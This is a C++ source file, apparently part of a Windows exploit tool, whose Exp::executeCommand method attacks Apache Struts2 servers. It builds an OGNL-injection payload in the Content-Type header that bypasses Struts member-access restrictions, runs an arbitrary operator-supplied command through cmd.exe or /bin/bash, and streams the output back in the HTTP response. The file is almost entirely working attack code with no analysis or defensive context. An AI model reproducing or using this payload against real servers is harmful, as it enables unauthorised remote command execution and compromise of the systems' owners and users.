#include "stdafx.h"
#include "Exp.h"
#include <winsock2.h>
#include<atlbase.h>
#include<atlconv.h>
#include <stdio.h>
#include <afxinet.h>

Exp::Exp(void)
{
}


Exp::~Exp(void)
{
}

CString Exp::executeCommand(CString url,CString command)
{
	CString urlHost = ""; //主机
	CString urlPath = ""; //路径
	CString contextTypeStr = "Content-Type: %{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"
		+ command + "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}";
	CString postData = "";
	CString resultPage;

	/* URL解析 */
	CString urlPrefix = "http://"; //URL前缀
	CString urlSeparator = "/"; //URL分隔符
	int urlPrefixPos = url.Find(urlPrefix); //查找第一个前缀位置
	if(urlPrefixPos >= 0) //存在前缀
		url = url.Mid(urlPrefixPos+urlPrefix.GetLength()); //去除前缀
	int urlSeparatorPos = url.Find(urlSeparator); //查找第一个分隔符位置
	if(urlSeparatorPos >= 0) //存在分隔符
	{
		urlHost = url.Mid(0,urlSeparatorPos); //取主机名
		urlPath = url.Mid(urlSeparatorPos); //取路径 包括分隔符
	}

	try
	{
		CInternetSession httpSession;
		httpSession.SetOption(INTERNET_OPTION_CONNECT_TIMEOUT,15000); //超时时间
		httpSession.SetOption(INTERNET_OPTION_CONNECT_BACKOFF,500);		// 重试间隔时间	
		httpSession.SetOption(INTERNET_OPTION_CONNECT_RETRIES,3);	//重试次数
		CHttpConnection* HttpConnection = httpSession.GetHttpConnection(urlHost);
		CHttpFile* httpFile = HttpConnection->OpenRequest(CHttpConnection::HTTP_VERB_POST,urlPath,NULL,1,NULL,"HTTP/1.1",INTERNET_FLAG_RELOAD|INTERNET_FLAG_EXISTING_CONNECT|INTERNET_FLAG_NO_CACHE_WRITE);
		CString header = contextTypeStr;
		httpFile->SendRequest(header,header.GetLength(),(LPVOID)((LPCTSTR)postData),postData.GetLength());
		DWORD statusCode;	//HTTP状态码
		httpFile->QueryInfoStatusCode(statusCode);
		if(statusCode != 200) 
		{
			return false;
		}
		char readBuff[4096]={0};
		int readNum = 0;
		while((readNum = httpFile->Read((void*)readBuff,4095))>0)
		{
			readBuff[readNum] = '\0';
			resultPage += readBuff;
			memset(readBuff,0,4096);
		}
	}
	catch(CInternetException* e)
	{
	}
	return resultPage;
}
